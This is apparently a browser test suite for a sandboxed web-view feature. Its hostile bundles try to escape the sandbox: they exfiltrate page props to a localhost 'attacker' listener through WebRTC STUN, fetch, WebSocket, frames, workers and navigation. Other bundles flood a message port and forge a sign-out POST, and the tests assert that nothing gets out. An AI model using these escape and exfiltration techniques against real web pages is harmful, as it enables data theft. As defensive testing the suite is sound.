// An island's web view (architect#608) against a hostile bundle, in a real
// browser: a node with an island (`island_node`, ARCHITECT_ISLAND_NODE) on
// a vault of its own, its `web-*` bundle written here, an attacker's HTTP
// and UDP listener on localhost.
//
// - The default frame: the bundle tries WebRTC (STUN), fetch, WebSocket,
//   beacon, an image, a stylesheet's url(), window.open, top navigation,
//   `<a ping>`, links that prefetch, and navigating itself off the node.
//   The listener must hear nothing. When it leaves its document, the page
//   takes it down and its own controls come back.
// - The review's probes (#608): child frames of every kind (about:blank,
//   srcdoc, blob:, data:, the webview-rtc document, the default one, and
//   srcdoc children running the frame's own script with WebRTC switched
//   on), workers, `document.open`; each tries a STUN peer connection and a
//   fetch to the listener, so any escape is a hit.
// - Navigating itself to the webview-rtc document (not served on a node
//   that grants no island WebRTC: a 404, and a second load, so gone).
// - The port captured and flooded (hello, ready, size, asks): booted once,
//   reported through the page's playhead.
// - WebRTC granted by the operator and declared by the manifest: the frame
//   is the `webview-rtc` document and a loopback peer connection works in
//   it. Granted but not declared: the default document, no WebRTC.
//
// Driver: DRIVER=firefox (default; FIREFOX=… or `firefox` on the PATH,
// WebDriver BiDi) or DRIVER=safari (`safaridriver`, classic WebDriver).
// The suite drives the page WITHOUT evaluating script in it (Safari runs a
// WebDriver script in the page's world, under the page's CSP, which
// refuses eval): one set of operations, open a URL, count elements, read
// an attribute, click, set and read a cookie, each backed by plain
// WebDriver commands on Safari and by BiDi on Firefox. What it asserts is
// in the DOM (the frame there or gone, `hidden`, classes, the position
// bar's `aria-valuenow` after the bundle asks the page to seek) or outside
// the browser (the listener's hits, HTTP and UDP; the node's answers).
//
// On a Mac: `safaridriver --enable` once (Safari's Develop menu: Allow
// Remote Automation), quit Safari, then `DRIVER=safari just
// share-webview-test`. The suite starts and stops `safaridriver` itself on
// a free port. `DRIVER=gecko` runs that same classic path against Firefox
// (geckodriver), so it is exercised without a Mac. Each test prints PASS or FAIL, and on a failure the element
// state it last polled (Safari gives no console logs).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawn, execFileSync } from 'node:child_process';
import { mkdtempSync, mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { createSocket } from 'node:dgram';
import { createServer as createNetServer } from 'node:net';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

const NODE = process.env.ARCHITECT_ISLAND_NODE;
const DRIVER = process.env.DRIVER || 'firefox';
function which(cmd) {
  try { return execFileSync('sh', ['-c', `command -v ${cmd}`]).toString().trim() || null; } catch { return null; }
}
// DRIVER=gecko: the same classic WebDriver backend as Safari's (no script
// in the page at all), against Firefox through geckodriver (GECKODRIVER=…
// or on the PATH): the Safari path, run where there is no Mac.
const browser = DRIVER === 'safari' ? which('safaridriver') : DRIVER === 'gecko' ? process.env.GECKODRIVER || which('geckodriver') : process.env.FIREFOX || which('firefox');
const skip = NODE && browser ? false : `needs ARCHITECT_ISLAND_NODE (just share-webview-test) and ${DRIVER === 'safari' ? 'safaridriver' : DRIVER === 'gecko' ? 'geckodriver (GECKODRIVER=…)' : 'a Firefox (FIREFOX=…)'}`;
// CI (.github/workflows/browser.yml) has a browser: missing one there is a
// failure, never a skip.
if (process.env.ARCHITECT_BROWSER_REQUIRED && skip) throw new Error(`ARCHITECT_BROWSER_REQUIRED: ${skip}`);
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const put = (root, rel, body) => { const p = join(root, rel); mkdirSync(dirname(p), { recursive: true }); writeFileSync(p, body); };
function wav(seconds) {
  const rate = 8000, n = Math.round(seconds * rate), b = Buffer.alloc(44 + n * 2);
  b.write('RIFF', 0); b.writeUInt32LE(36 + n * 2, 4); b.write('WAVE', 8); b.write('fmt ', 12); b.writeUInt32LE(16, 16); b.writeUInt16LE(1, 20); b.writeUInt16LE(1, 22);
  b.writeUInt32LE(rate, 24); b.writeUInt32LE(rate * 2, 28); b.writeUInt16LE(2, 32); b.writeUInt16LE(16, 34); b.write('data', 36); b.writeUInt32LE(n * 2, 40);
  for (let i = 0; i < n; i++) b.writeInt16LE(Math.round(800 * Math.sin((2 * Math.PI * 220 * i) / rate)), 44 + i * 2);
  return b;
}
// The smallest module wasm-bindgen's glue would be handed: never compiled
// by these bundles, only carried.
const WASM = Buffer.from([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);

/// A bundle that tries every way out to the attacker at `a` (http://host:port),
/// `rtc` the path of the node's webview-rtc document.
const EVIL = (a, port, rtc) => `
export default async function init() {}
export function mount() {
  const A = ${JSON.stringify(a)};
  const t = (fn) => { try { const r = fn(); if (r && r.catch) r.catch(() => {}); } catch (e) {} };
  t(() => { const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${port}" }] }); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); });
  t(() => { const P = globalThis.webkitRTCPeerConnection; new P({ iceServers: [{ urls: "stun:127.0.0.1:${port}" }] }); });
  t(() => fetch(A + "/fetch"));
  t(() => new WebSocket(A.replace("http", "ws") + "/ws"));
  t(() => new EventSource(A + "/sse"));
  t(() => navigator.sendBeacon(A + "/beacon", "x"));
  t(() => { const i = new Image(); i.src = A + "/img"; document.body.appendChild(i); });
  t(() => { const s = document.createElement("style"); s.textContent = "@import url('" + A + "/css-import'); #main{background:url('" + A + "/css-bg')}"; document.head.appendChild(s); });
  t(() => { for (const rel of ["prefetch", "dns-prefetch", "preconnect", "preload", "stylesheet"]) { const l = document.createElement("link"); l.rel = rel; l.href = A + "/link-" + rel; l.as = "image"; document.head.appendChild(l); } });
  t(() => { const a = document.createElement("a"); a.href = "#p"; a.ping = A + "/ping"; document.body.appendChild(a); a.click(); });
  t(() => window.open(A + "/popup"));
  t(() => { top.location = A + "/top"; });
  t(() => import(A + "/import.js"));
  // What a child or a worker tries: a STUN peer connection and a fetch.
  const STUN = JSON.stringify({ iceServers: [{ urls: "stun:127.0.0.1:${port}" }] });
  const payload = (tag) => "try { const pc = new RTCPeerConnection(" + STUN + "); pc.createDataChannel('x'); pc.createOffer().then((o) => pc.setLocalDescription(o)); } catch (e) {} try { fetch(" + JSON.stringify(A) + " + '/kid-" + tag + "'); } catch (e) {}";
  const blob = (tag, type) => URL.createObjectURL(new Blob([payload(tag)], { type: type || "text/javascript" }));
  // Child frames, every kind: a fresh global has its own constructors.
  const kids = [
    ["about-blank", () => {}],
    ["srcdoc", (f) => { f.srcdoc = "<script>" + payload("srcdoc") + "<\\/script>"; }],
    ["blob", (f) => { f.src = URL.createObjectURL(new Blob(["<script>" + payload("blob-doc") + "<\\/script>"], { type: "text/html" })); }],
    ["data", (f) => { f.src = "data:text/html," + encodeURIComponent("<script>" + payload("data-doc") + "<\\/script>"); }],
    ["rtc-doc", (f) => { f.src = ${JSON.stringify(rtc)}; }],
    ["default-doc", (f) => { f.src = location.pathname; }],
  ];
  const own = document.scripts[0] ? document.scripts[0].textContent : "";
  const docs = {
    "module-parent-blob": '<script type="module" src="' + blob("module-parent-blob") + '"><\\/script>',
    "classic-parent-blob": '<script src="' + blob("classic-parent-blob") + '"><\\/script>',
    "rtc-variant-inline": "<script>" + own.replace("var RTC = false;", "var RTC = true;") + "<\\/script><script>" + payload("rtc-variant") + "<\\/script>",
    "own-webview": '<div id="main"></div><script>' + own + "<\\/script>",
  };
  for (const [name, html] of Object.entries(docs)) kids.push([name, (f) => { f.srcdoc = html; }]);
  for (const [name, set] of kids) {
    t(() => {
      const f = document.createElement("iframe");
      set(f);
      document.body.appendChild(f);
      t(() => { const C = f.contentWindow && f.contentWindow.RTCPeerConnection; if (C) { const pc = new C(JSON.parse(STUN)); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } });
      f.addEventListener("load", () => {
        t(() => { const C = f.contentWindow && f.contentWindow.RTCPeerConnection; if (C) { const pc = new C(JSON.parse(STUN)); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } });
        // Be the parent of a web view document and boot a payload in it.
        t(() => {
          const ch = new MessageChannel();
          f.contentWindow.postMessage("architect-web", "*", [ch.port2]);
          const src = new TextEncoder().encode("export default async function(){} export function mount(){ " + payload("booted-" + name) + " }");
          setTimeout(() => ch.port1.postMessage({ t: "boot", entry: "web-x.js", view: "v", files: { "web-x.js": src, "web-x_bg.wasm": new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0]) } }), 300);
        });
      });
    });
  }
  t(() => new Worker(blob("worker")));
  t(() => new SharedWorker(blob("sharedworker")));
  t(() => navigator.serviceWorker.register("/sw.js"));
  // A new document in the same window: its globals as the page left them?
  setTimeout(() => t(() => { document.open(); document.write("<p>x</p>"); document.close(); const C = globalThis.RTCPeerConnection || globalThis.webkitRTCPeerConnection; if (C) { const pc = new C(JSON.parse(STUN)); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)); } }), 2500);
  // Off the node, carrying what the page handed it (the page's frame-src
  // refuses it: the frame stays where it is) ...
  setTimeout(() => { location.href = A + "/selfnav?props=" + encodeURIComponent(JSON.stringify(globalThis.architectPage.props)); }, 3000);
  // ... then somewhere on the node, which its policy does let it reach.
  setTimeout(() => { location.href = "/s/_signout?to=/"; }, 5000);
}`;

/// A bundle that reports whether it has WebRTC and a loopback connection:
/// it asks the page to seek to 7 when it does, 3 when it does not.
const RTC = `
export default async function init() {}
export function mount() {
  const say = (t) => globalThis.architectPage.ask("PLAYHEAD_SEEK", { t });
  (async () => {
    try {
      if (typeof RTCPeerConnection !== "function") return say(3);
      const a = new RTCPeerConnection(), b = new RTCPeerConnection();
      a.onicecandidate = (e) => e.candidate && b.addIceCandidate(e.candidate);
      b.onicecandidate = (e) => e.candidate && a.addIceCandidate(e.candidate);
      a.createDataChannel("loop");
      await a.setLocalDescription(await a.createOffer());
      await b.setRemoteDescription(a.localDescription);
      await b.setLocalDescription(await b.createAnswer());
      await a.setRemoteDescription(b.localDescription);
      say(7);
    } catch (e) { say(3); }
  })();
}`;

/// A bundle that navigates itself to `rtc` (the webview-rtc document).
const SELF_TO_RTC = (rtc) => `
export default async function init() {}
export function mount() { setTimeout(() => { location.href = ${JSON.stringify(rtc)}; }, 1500); }`;

/// A bundle that captures the frame's port and floods the page: hellos,
/// readies, sizes, asks. Then, once the page's rate limit has refilled, it
/// reports how many times the page booted it again (it was booted once,
/// before it mounted) by asking the page to seek to 20 + boots.
const FLOOD = `
export default async function init() {}
export function mount() {
  let port = null; const orig = MessagePort.prototype.postMessage;
  MessagePort.prototype.postMessage = function () { port = this; return orig.apply(this, arguments); };
  globalThis.architectPage.ask("nothing");
  MessagePort.prototype.postMessage = orig;
  if (!port) return;
  let boots = 0;
  port.addEventListener("message", (m) => { if ((m.data || {}).t === "boot") boots++; });
  for (let i = 0; i < 500; i++) orig.call(port, { t: "hello" });
  for (let i = 0; i < 500; i++) orig.call(port, { t: "ready" });
  for (let i = 0; i < 5000; i++) orig.call(port, { t: "size", height: (i % 2) ? 100 : 3000 });
  for (let i = 0; i < 1000; i++) orig.call(port, { t: "ask", action: "PLAYHEAD_SEEK", args: { t: (i % 10) + 1 } });
  setTimeout(() => globalThis.architectPage.ask("PLAYHEAD_SEEK", { t: 20 + boots }), 4000);
}`;

/// A bundle that builds the node's sign-out form in its frame and submits
/// it, by a click and by `submit()`: the POST the confirm page's button
/// makes, from a sandboxed frame (no `allow-forms`; its Origin would be
/// `null`).
const SIGN_OUT = `
export default async function init() {}
export function mount() {
  setTimeout(() => {
    try {
      const f = document.createElement("form");
      f.method = "post"; f.action = "/s/_signout?to=/";
      const b = document.createElement("button"); b.type = "submit"; f.appendChild(b);
      document.body.appendChild(f);
      b.click();
      f.submit();
    } catch (e) {}
  }, 1000);
}`;

const CODE = 'gigabcdefhjkmnpq', L = `/s/${CODE}`;

/// A node serving a link share with a playlist and the island `bundle`
/// (its manifest declaring `caps`), WebRTC granted when `grant`.
async function node(bundle, { caps = {}, grant = false } = {}) {
  const dir = mkdtempSync(join(tmpdir(), 'webview-'));
  const vault = join(dir, 'vault');
  put(vault, 'Gig/01-joy.md', '---\ntitle: Joy\n---\n![[media/joy.wav]]\n');
  put(vault, 'Gig/03-list.md', '---\ntitle: List\n---\n<div data-playlist data-title="Set"><ul>' +
    `<li data-track data-media="${L}/Gig/media/joy.wav" data-page="${L}/01-joy/" data-title="Joy">Joy</li></ul></div>\n`);
  put(vault, 'Gig/media/joy.wav', wav(30));
  const share = { code: CODE, vault: 'notes', scope: { Folder: 'Gig' }, title: 'The gig', audience: 'Link', access: 'Read', expires_at: null, revoked_at: null, created_at: 1, created_by: 'test', domain: null };
  put(vault, `_architect/shares/${CODE}.md`, `---\npublish: false\n---\n# Share ${CODE}\n\n\`\`\`json\n${JSON.stringify(share)}\n\`\`\`\n`);
  const folder = join(dir, 'island');
  put(folder, 'web-view.js', bundle);
  put(folder, 'web-view_bg.wasm', WASM);
  put(folder, 'architect.json', JSON.stringify({ module: 'web-view.js', manifest: { id: 'demo.view', capabilities: caps } }));
  const port = 19700 + Math.floor(Math.random() * 90);
  const proc = spawn(NODE, [], {
    stdio: 'ignore',
    env: { ...process.env, ARCHITECT_BIND: `127.0.0.1:${port}`, ARCHITECT_DATA_DIR: join(dir, 'data'), ARCHITECT_VAULTS: `notes=${vault}`, ARCHITECT_IROH: 'local', ARCHITECT_NAME: 'webview-test', ARCHITECT_ISLAND_FOLDER: folder, ARCHITECT_ISLAND_VIEW: 'view', ARCHITECT_ISLAND_WEBRTC: grant ? '1' : '0' },
  });
  const origin = `http://127.0.0.1:${port}`;
  for (let i = 0; i < 160; i++) {
    await sleep(250);
    const html = await fetch(`${origin}${L}/03-list/`).then((r) => (r.ok ? r.text() : '')).catch(() => '');
    if (html.includes('site-islands')) return { origin, close: () => { proc.kill(); rmSync(dir, { recursive: true, force: true }); } };
  }
  proc.kill();
  throw new Error('the node never served the list');
}

/// An attacker: what it hears, HTTP and UDP (STUN), on one port.
function attacker() {
  const port = 20500 + Math.floor(Math.random() * 400);
  const hits = [];
  const http = createServer((req, res) => { hits.push(`${req.method} ${req.url.slice(0, 120)}`); res.statusCode = 204; res.end(); });
  http.listen(port, '127.0.0.1');
  const udp = createSocket('udp4');
  udp.on('message', (m) => hits.push(`UDP ${m.length}B (STUN)`));
  udp.bind(port, '127.0.0.1');
  return { port, url: `http://127.0.0.1:${port}`, hits, close: () => { http.close(); udp.close(); } };
}

// ── The two drivers: the same operations, no script in the page ─────

const freePort = () => new Promise((ok) => { const srv = createNetServer(); srv.listen(0, '127.0.0.1', () => { const { port } = srv.address(); srv.close(() => ok(port)); }); });

async function firefox() {
  const profile = mkdtempSync(join(tmpdir(), 'webview-ff-'));
  writeFileSync(join(profile, 'user.js'), 'user_pref("media.autoplay.default", 0);\nuser_pref("media.autoplay.blocking_policy", 0);\n');
  const port = await freePort();
  const proc = spawn(browser, ['--headless', '--no-remote', '--profile', profile, '--remote-debugging-port', String(port)], { stdio: 'ignore' });
  let ws;
  for (let i = 0; i < 80 && !ws; i++) {
    await sleep(250);
    try { const s = new WebSocket(`ws://127.0.0.1:${port}/session`); await new Promise((ok, no) => { s.onopen = ok; s.onerror = no; }); ws = s; } catch {}
  }
  if (!ws) throw new Error('firefox did not start');
  let id = 0;
  const waiting = new Map();
  ws.onmessage = (e) => { const m = JSON.parse(e.data); if (m.id && waiting.has(m.id)) { const w = waiting.get(m.id); waiting.delete(m.id); m.type === 'error' ? w.no(new Error(`${m.error}: ${m.message}`)) : w.ok(m.result); } };
  const send = (method, params = {}) => new Promise((ok, no) => { const i = ++id; waiting.set(i, { ok, no }); ws.send(JSON.stringify({ id: i, method, params })); });
  await send('session.new', { capabilities: {} });
  const context = (await send('browsingContext.getTree', {})).contexts[0].context;
  // BiDi evaluates outside the page's CSP; each operation is one fixed,
  // read-only query (or a click), the same as the Safari backend's command.
  const ev = async (expression) => {
    const r = await send('script.evaluate', { expression, target: { context }, awaitPromise: false, userActivation: true });
    if (r.type === 'exception') throw new Error(r.exceptionDetails.text);
    return r.result.value;
  };
  const q = (css) => JSON.stringify(css);
  return {
    go: (url) => send('browsingContext.navigate', { context, url, wait: 'complete' }),
    count: (css) => ev(`document.querySelectorAll(${q(css)}).length`),
    attr: (css, name) => ev(`(function (e) { return e ? e.getAttribute(${q(name)}) : null; })(document.querySelector(${q(css)}))`),
    click: (css) => ev(`(function (e) { if (!e) throw new Error("no " + ${q(css)}); e.click(); return true; })(document.querySelector(${q(css)}))`),
    setCookie: (name, value) => ev(`document.cookie = ${q(`${name}=${value}; path=/; SameSite=Lax`)}, true`),
    cookie: (name) => ev(`(function (m) { return m ? m[1] : null; })(document.cookie.match(${q(`(?:^|; )${name}=([^;]*)`)}))`),
    close: () => { ws.close(); proc.kill(); try { rmSync(profile, { recursive: true, force: true }); } catch {} },
  };
}

const ELEMENT = 'element-6066-11e4-a52e-4f735466cecf';
/// Classic WebDriver (Safari's `safaridriver`, or Firefox's geckodriver):
/// navigate, find elements, read attributes, click, cookies. Nothing else.
async function classic() {
  const port = await freePort();
  const gecko = DRIVER === 'gecko';
  const args = gecko ? ['--port', String(port)] : ['-p', String(port)];
  const proc = spawn(browser, args, { stdio: ['ignore', 'ignore', 'pipe'] });
  let said = '';
  proc.stderr.on('data', (d) => { said += d; });
  const base = `http://127.0.0.1:${port}`;
  const call = async (method, path, body) => {
    const r = await fetch(base + path, { method, headers: { 'content-type': 'application/json' }, body: body === undefined ? undefined : JSON.stringify(body) });
    const j = await r.json();
    if (j.value && j.value.error) { const e = new Error(`${j.value.error}: ${j.value.message}`); e.webdriver = j.value.error; throw e; }
    return j.value;
  };
  for (let i = 0; i < 40; i++) {
    await sleep(250);
    if (await fetch(base + '/status').then((r) => r.ok, () => false)) break;
  }
  let session;
  try {
    const firefoxOptions = { args: ['-headless'], prefs: { 'media.autoplay.default': 0, 'media.autoplay.blocking_policy': 0 } };
    if (process.env.FIREFOX || which('firefox')) firefoxOptions.binary = process.env.FIREFOX || which('firefox');
    const caps = gecko ? { browserName: 'firefox', 'moz:firefoxOptions': firefoxOptions } : { browserName: 'safari' };
    session = (await call('POST', '/session', { capabilities: { alwaysMatch: caps } })).sessionId;
  } catch (e) {
    proc.kill();
    const why = String(e.message) + ' ' + said;
    if (/remote automation/i.test(why)) throw new Error('Safari refused the session: turn on "Allow Remote Automation" (Safari > Settings > Advanced > Show features for web developers, then Develop > Allow Remote Automation; or `safaridriver --enable`). ' + why);
    if (/already|paired|session/i.test(why)) throw new Error('Safari refused the session: quit Safari (and any other WebDriver session) first. ' + why);
    throw new Error('safaridriver did not start a session: ' + why);
  }
  const S = `/session/${session}`;
  const all = async (css) => (await call('POST', `${S}/elements`, { using: 'css selector', value: css })).map((e) => e[ELEMENT]);
  const one = async (css) => (await all(css))[0] || null;
  return {
    go: (url) => call('POST', `${S}/url`, { url }),
    count: async (css) => (await all(css)).length,
    attr: async (css, name) => {
      const e = await one(css);
      return e ? call('GET', `${S}/element/${e}/attribute/${encodeURIComponent(name)}`) : null;
    },
    click: async (css) => {
      const e = await one(css);
      if (!e) throw new Error(`no ${css}`);
      return call('POST', `${S}/element/${e}/click`, {});
    },
    setCookie: (name, value) => call('POST', `${S}/cookie`, { cookie: { name, value, path: '/', sameSite: 'Lax' } }),
    cookie: async (name) => { try { return (await call('GET', `${S}/cookie/${encodeURIComponent(name)}`)).value; } catch (e) { if (e.webdriver === 'no such cookie') return null; throw e; } },
    close: async () => { try { await call('DELETE', S); } catch {} proc.kill(); },
  };
}

const open = () => (DRIVER === 'safari' || DRIVER === 'gecko' ? classic() : firefox());

/// Polls `look` (an async read of the page, through the driver's
/// operations) until `ok(state)`; on timeout, fails with what it last saw.
async function until(look, ok, what, ms = 20000) {
  const start = Date.now();
  let state;
  for (;;) {
    try { state = await look(); } catch (e) { state = { error: String(e.message || e) }; }
    if (!(state && state.error) && ok(state)) return state;
    if (Date.now() - start > ms) throw new Error(`waited ${ms} ms for ${what}; last saw ${JSON.stringify(state)}`);
    await sleep(150);
  }
}

/// What the tests read of the page: the view's frames, its controls and
/// bar (yielded or not), the bar's position (its `aria-valuenow`, whole
/// seconds), the song row's state.
const FRAME = 'iframe.site-now-web';
async function state(tab) {
  const has = (css, cls) => tab.attr(css, 'class').then((c) => (c == null ? null : String(c).split(/\s+/).includes(cls)));
  return {
    frames: await tab.count(FRAME),
    frameSrc: await tab.attr(FRAME, 'src'),
    controlsYielded: await has('.site-now-controls', 'site-now-yielded'),
    barYielded: await has('.site-now-progress', 'site-now-yielded'),
    at: Number(await tab.attr('.site-now-seek', 'aria-valuenow')),
    row: await tab.attr('[data-track]', 'data-state'),
  };
}
const path = (src) => (src ? new URL(src, 'http://x').pathname : null);

/// A test that prints PASS or FAIL with the page's state on a failure.
function check(name, opts, fn) {
  test(name, opts, async () => {
    try {
      await fn();
      console.log(`PASS ${name}`);
    } catch (e) {
      console.log(`FAIL ${name}: ${e.message}`);
      throw e;
    }
  });
}

/// Its list, Joy current (paused, so the position holds still), its
/// now-playing view open with the island.
async function openView(tab, origin) {
  await tab.go(`${origin}${L}/03-list/`);
  await tab.setCookie('probe', 'kept');
  await tab.click('[data-track]');
  const row = await until(() => tab.attr('[data-track]', 'data-state'), (v) => v === 'playing' || v === 'paused', 'Joy current');
  if (row === 'playing') {
    await tab.click('.site-player [data-act="toggle"]');
    await until(() => tab.attr('[data-track]', 'data-state'), (v) => v === 'paused', 'Joy paused');
  }
  await tab.click('.site-player-what');
  return until(() => state(tab), (s) => s.frames > 0, 'the frame');
}

/// The webview-rtc document's path (the same on every node of a build),
/// read from a node that grants it.
let rtcDoc = null;
async function rtcPath() {
  if (rtcDoc) return rtcDoc;
  const { origin, close } = await node(RTC, { caps: { webrtc: ['peer-connections'] }, grant: true });
  try {
    const html = await fetch(`${origin}${L}/03-list/`).then((r) => r.text());
    const m = /\/_ext\/webview-rtc\.[0-9a-f]+\.html/.exec(html);
    assert.ok(m, 'a granted node names its webview-rtc document');
    rtcDoc = m[0];
    assert.equal((await fetch(origin + rtcDoc)).status, 200, 'served where granted');
  } finally {
    close();
  }
  return rtcDoc;
}

check('a default web view reaches nothing off the node, and leaving its document gives the controls back', { skip, timeout: 180000 }, async () => {
  const rtc = await rtcPath();
  const atk = attacker();
  const { origin, close } = await node(EVIL(atk.url, atk.port, rtc));
  const tab = await open();
  try {
    const opened = await openView(tab, origin);
    assert.match(path(opened.frameSrc), /^\/_ext\/webview\.[0-9a-f]+\.html$/, JSON.stringify(opened));
    // Every way out tried, the self-navigation off the node (3 s), then
    // on it (5 s), then its death.
    await sleep(9000);
    assert.deepEqual(atk.hits, [], 'the attacker heard nothing');
    const after = await until(() => state(tab), (s) => s.frames === 0, 'the frames gone');
    assert.equal(after.controlsYielded, false, `the controls are back: ${JSON.stringify(after)}`);
    assert.equal(after.barYielded, false, `the bar is back: ${JSON.stringify(after)}`);
    // Its navigation to the node's sign-out was a GET: a page asking, the
    // visitor's cookie kept.
    assert.equal(await tab.cookie('probe'), 'kept');
  } finally {
    await tab.close();
    close();
    atk.close();
  }
});

check('navigating itself to the webview-rtc document: not served here, the frame taken down', { skip, timeout: 180000 }, async () => {
  const rtc = await rtcPath();
  const atk = attacker();
  const { origin, close } = await node(SELF_TO_RTC(rtc));
  const tab = await open();
  try {
    assert.equal((await fetch(origin + rtc)).status, 404, 'a node granting no island WebRTC has no such document');
    await openView(tab, origin);
    const after = await until(() => state(tab), (s) => s.frames === 0, 'the frame taken down');
    assert.equal(after.barYielded, false, `the page's own bar back: ${JSON.stringify(after)}`);
    assert.deepEqual(atk.hits, []);
  } finally {
    await tab.close();
    close();
    atk.close();
  }
});

check('a frame that captures its port and floods the page is booted once and stays up', { skip, timeout: 120000 }, async () => {
  const atk = attacker();
  const { origin, close } = await node(FLOOD);
  const tab = await open();
  try {
    await openView(tab, origin);
    const after = await until(() => state(tab), (s) => s.at >= 20, 'the bundle\'s report', 30000);
    assert.equal(after.at, 20, `never booted again, after 500 hellos: ${JSON.stringify(after)}`);
    assert.ok(after.frames > 0, `still up: a flood is not an error: ${JSON.stringify(after)}`);
    assert.deepEqual(atk.hits, []);
  } finally {
    await tab.close();
    close();
    atk.close();
  }
});

check('WebRTC only when declared and granted: its own document, a loopback that works', { skip, timeout: 180000 }, async () => {
  for (const [caps, grant, want, doc] of [
    [{ webrtc: ['peer-connections'] }, true, 7, /^\/_ext\/webview-rtc\.[0-9a-f]+\.html$/],
    [{}, true, 3, /^\/_ext\/webview\.[0-9a-f]+\.html$/],
    [{ webrtc: ['peer-connections'] }, false, 3, /^\/_ext\/webview\.[0-9a-f]+\.html$/],
  ]) {
    const { origin, close } = await node(RTC, { caps, grant });
    const tab = await open();
    try {
      const opened = await openView(tab, origin);
      assert.match(path(opened.frameSrc), doc, JSON.stringify({ caps, grant, opened }));
      // The bundle's report: the page seeks to 7 (a loopback worked) or 3.
      const after = await until(() => state(tab), (s) => s.at === 3 || s.at === 7, 'the bundle\'s report');
      assert.equal(after.at, want, JSON.stringify({ caps, grant, after }));
    } finally {
      await tab.close();
      close();
    }
  }
});

check('the node\'s own sign-out form signs the visitor out; a web view frame\'s cannot', { skip, timeout: 120000 }, async () => {
  const { origin, close } = await node(SIGN_OUT);
  const tab = await open();
  try {
    // The confirm page's own form (a real form post from the node's page).
    await tab.go(`${origin}/s/_signout?to=${L}/03-list/`);
    await tab.setCookie('architect_session', 'signed-in');
    assert.equal(await tab.cookie('architect_session'), 'signed-in');
    await tab.click('form[action^="/s/_signout"] button[type="submit"]');
    await until(() => tab.cookie('architect_session'), (v) => v == null, 'the session cleared by the page\'s own form');
    await until(() => tab.count('[data-track]'), (n) => n > 0, 'back on the list it came from');
    // A web view frame building and submitting the same form: not sent.
    await tab.setCookie('architect_session', 'signed-in');
    await openView(tab, origin);
    await sleep(3000);
    assert.equal(await tab.cookie('architect_session'), 'signed-in', 'the frame could not sign the visitor out');
  } finally {
    await tab.close();
    close();
  }
});
